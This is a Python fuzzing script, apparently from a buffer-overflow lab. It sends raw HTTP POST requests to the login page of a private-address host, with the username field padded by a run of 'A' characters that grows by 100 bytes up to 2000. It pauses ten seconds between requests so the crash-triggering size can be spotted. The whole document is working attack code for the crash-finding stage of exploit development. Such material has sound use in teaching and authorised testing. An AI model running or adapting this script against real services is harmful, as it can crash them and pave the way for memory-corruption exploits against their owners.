import socket
import sys
import time

size = 100

# Setting a loop to send multiple requests

while(size < 2000):  
	try:
		print(f"\nSending evil buffer with {size} bytes")
	
		input_buffer = "A" * size
	
		input_content = "username=" + input_buffer + "&password=bar"
	
		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: 192.168.155.10\r\n"
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
		buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Accept-Encoding: gzip, deflate\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length: "+str(len(input_content))+"\r\n"
		buffer += "Origin: http://192.168.155.10\r\n"
		buffer += "Connection: close\r\n"
		buffer += "Referer: http://192.168.155.10/login\r\n"
		buffer += "Upgrade-Insecure-Requests: 1"
		buffer += "\r\n"
	
		buffer += input_content
 
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
   
		s.connect(("192.168.155.10", 80))

		s.send(buffer.encode())
	
		s.close()

		# Incrementing (increasing) the size of the input (before it is sent again)
		size += 100

		# Sleep for 10 seconds so you can more clearly show which POST request triggered the vuln
		time.sleep(10)

	except Exception as e:
		print("Could not connect :(\n")
		print(e)
		sys.exit()